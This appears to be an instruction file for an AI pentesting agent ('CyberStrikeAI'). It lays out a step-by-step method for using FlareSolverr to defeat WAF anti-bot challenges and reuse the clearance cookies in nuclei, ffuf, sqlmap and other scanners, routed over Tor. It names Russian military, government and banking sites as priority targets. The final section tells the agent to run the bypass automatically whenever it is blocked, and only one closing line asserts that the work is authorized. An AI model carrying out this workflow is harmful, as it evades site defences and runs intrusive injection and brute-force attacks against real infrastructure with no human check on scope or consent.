# FlareSolverr WAF Bypass & Cookie Reuse Methodology

## Overview

FlareSolverr runs a real Chromium browser that solves anti-bot challenge pages from DDoS-Guard, QRator, Cloudflare, and similar WAF/protection services. Once solved, it exports clearance cookies and the accepted user-agent. These can be reused with ANY tool - curl, nuclei, ffuf, sqlmap, nikto, httpx - to access content that would otherwise return 403/challenge pages.

**Primary use case: bypassing Russian WAF services (DDoS-Guard, QRator, StormWall, Wallarm) on target infrastructure.**

## Target WAF Services (Priority Order)

| WAF Service | Detection | Cookie Names | Prevalence |
|-------------|-----------|-------------|------------|
| **DDoS-Guard** | `server: ddos-guard`, `__ddg1_`, `__ddg2_` headers | `__ddg1_`, `__ddg2_`, `__ddgid_`, `__ddgmark_` | Very common on .ru/.su domains |
| **QRator** | `server: qrator`, `qrator_jsid` cookie | `qrator_jsid`, `qrator_jsr` | Russian gov, banking, media |
| **StormWall** | `server: stormwall`, JS challenge | `swp_token`, `__swp_*` | Russian hosting, ISPs |
| **Wallarm** | `wallarm-waf-*` headers | varies | Russian enterprise |
| **Cloudflare** | `server: cloudflare`, `cf-ray` header | `cf_clearance`, `__cf_bm` | International |
| **Akamai** | `server: AkamaiGHost` | `_abck`, `bm_sz`, `akaalb_*` | International |
| **Imperva/Incapsula** | `X-CDN: Imperva` | `visid_incap_*`, `incap_ses_*` | International |

## When to Use FlareSolverr

- Target returns **403 Forbidden** or JavaScript challenge to direct HTTP requests
- Scanning tools (nuclei/ffuf/nikto) return empty or blocked responses
- Target is behind **DDoS-Guard, QRator, StormWall** (common on Russian .ru/.su infrastructure)
- HTTP headers contain `server: ddos-guard` or `server: qrator`
- Response body contains anti-bot JavaScript challenges
- You need cookies from the solved challenge to feed into other scanning tools

## Proxy Integration

**FlareSolverr inherits CyberStrikeAI's proxy configuration automatically.**

If CyberStrikeAI proxy is configured (Settings → Proxy), FlareSolverr's browser routes through the same proxy:

- **Tor** configured → FlareSolverr browser uses `socks5://127.0.0.1:9050`
- **SOCKS5** configured → FlareSolverr browser uses the same SOCKS5 proxy
- **HTTP proxy** configured → FlareSolverr browser uses the same HTTP proxy

This means cookies extracted through Tor will be valid for requests made through Tor. The IP seen by the WAF matches across all tools.

**Manual proxy override** (if you need a different proxy for FlareSolverr):
```bash
flaresolverr --url https://target.ru --proxy-url socks5://127.0.0.1:9050 --cookies-only
```

## Quick Start

```bash
# Step 1: Detect WAF on Russian target
curl -sI https://target.ru | grep -i "server\|ddos-guard\|qrator\|stormwall"

# Step 2: Solve the challenge and extract cookies
flaresolverr --url https://target.ru --cookies-only

# Step 3: Use extracted cookies with scanning tools
nuclei -u https://target.ru \
       -H "Cookie: __ddg1_=abc123; __ddg2_=xyz" \
       -H "User-Agent: Mozilla/5.0..." \
       -t cves/
```

## Cookie Extraction Workflow

### Phase 1: Detect WAF Protection

```bash
# Quick check - look for WAF indicators
curl -sI https://target.ru | head -20

# DDoS-Guard indicators:
#   server: ddos-guard
#   Set-Cookie: __ddg1_=...; __ddg2_=...
#   JavaScript challenge in response body

# QRator indicators:
#   server: qrator
#   Set-Cookie: qrator_jsid=...
#   302 redirect to challenge URL

# StormWall indicators:
#   server: stormwall
#   Set-Cookie: swp_token=...
#   JS challenge with CAPTCHA
```

### Phase 2: Extract Clearance Cookies

```bash
# Basic - auto-detects and solves whatever WAF is present
flaresolverr --url https://target.ru --cookies-only

# With proxy (inherits from CyberStrikeAI config, or manual override)
flaresolverr --url https://target.ru --cookies-only --proxy-url socks5://127.0.0.1:9050

# With increased timeout for slow Russian infrastructure
flaresolverr --url https://target.ru --cookies-only --max-timeout 120000

# Output:
# {
#   "cookie_header": "__ddg1_=abc123; __ddg2_=xyz789; __ddgid_=def456",
#   "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36...",
#   "cookies": [...]
# }
```

**Save both `cookie_header` and `user_agent` - WAFs verify both together.**

### Phase 3: Reuse Cookies with Security Tools

#### curl
```bash
curl -H "Cookie: <cookie_header>" \
     -H "User-Agent: <user_agent>" \
     https://target.ru/admin/
```

#### nuclei (vulnerability scanning)
```bash
nuclei -u https://target.ru \
       -H "Cookie: <cookie_header>" \
       -H "User-Agent: <user_agent>" \
       -t cves/ -t vulnerabilities/ -t misconfiguration/
```

#### ffuf (directory bruteforce)
```bash
ffuf -u https://target.ru/FUZZ \
     -w /usr/share/wordlists/common.txt \
     -H "Cookie: <cookie_header>" \
     -H "User-Agent: <user_agent>"
```

#### sqlmap (SQL injection)
```bash
sqlmap -u "https://target.ru/page?id=1" \
       --cookie="<cookie_header>" \
       --user-agent="<user_agent>" \
       --batch --risk=3 --level=5
```

#### httpx (technology detection)
```bash
echo "https://target.ru" | httpx \
     -H "Cookie: <cookie_header>" \
     -H "User-Agent: <user_agent>" \
     -status-code -title -tech-detect -web-server
```

#### gobuster (directory enumeration)
```bash
gobuster dir -u https://target.ru \
             -w /usr/share/wordlists/common.txt \
             -c "<cookie_header>" \
             -a "<user_agent>"
```

#### feroxbuster (recursive scanning)
```bash
feroxbuster -u https://target.ru \
            -H "Cookie: <cookie_header>" \
            -H "User-Agent: <user_agent>" \
            -w /usr/share/wordlists/common.txt --depth 3
```

### Phase 4: Session Persistence

For multi-step workflows (login forms, multi-page assessment):

```bash
# Create persistent session
flaresolverr --cmd sessions.create --session-id target-ru-session

# Multiple requests with maintained cookie jar
flaresolverr --url https://target.ru/login --session-id target-ru-session
flaresolverr --url https://target.ru/admin --session-id target-ru-session
flaresolverr --url https://target.ru/api/users --session-id target-ru-session

# Clean up
flaresolverr --cmd sessions.destroy --session-id target-ru-session
```

### Phase 5: Cookie Refresh

WAF cookies expire - DDoS-Guard typically 15-30 min, QRator varies.

Signs of expired cookies:
- Tools start getting 403 again
- Response body shows challenge page
- New `__ddg*` or `qrator_*` cookies in Set-Cookie headers

**Refresh:** Re-run `flaresolverr --url ... --cookies-only` and update cookie headers.

## DDoS-Guard Specific Notes

DDoS-Guard is the most common WAF on Russian military, government, and media targets.

**Detection:**
```bash
# All of these indicate DDoS-Guard
curl -sI https://target.ru | grep -i "ddos-guard"
curl -s https://target.ru | grep -i "ddos" | head -5
```

**Cookie chain:** DDoS-Guard uses a multi-step challenge:
1. Initial request → 302 redirect to challenge
2. JavaScript execution → generates `__ddg1_` cookie
3. Second request with cookie → generates `__ddg2_` and `__ddgid_`
4. Final request with all cookies → 200 OK

FlareSolverr handles the entire chain automatically.

**Persistence:** DDoS-Guard cookies are IP-bound. If your IP changes (Tor circuit rotation), cookies become invalid. Use `--proxy-url` with a stable exit node if needed.

## QRator Specific Notes

QRator is used by Russian banking, government services, and major enterprises.

**Detection:**
```bash
curl -sI https://target.ru | grep -i "qrator"
```

**Challenge type:** QRator uses JavaScript computation challenges (proof-of-work style). These take longer to solve - increase timeout:
```bash
flaresolverr --url https://target.ru --cookies-only --max-timeout 120000
```

## Agent Integration Pattern

The AI agent should follow this workflow automatically:

1. **First attempt** - direct tool call (nuclei, ffuf, etc.)
2. **403/challenge detected** → call `flaresolverr --url <target> --cookies-only`
3. **Extract** `cookie_header` and `user_agent` from response
4. **Re-run** original tool with `-H "Cookie: ..."` and `-H "User-Agent: ..."` injected
5. **Set timer** - refresh cookies every 15 minutes during long scans
6. **Proxy consistency** - ensure FlareSolverr and scanning tools use the same proxy/Tor circuit

This is the standard WAF bypass workflow for all authorized security assessments.
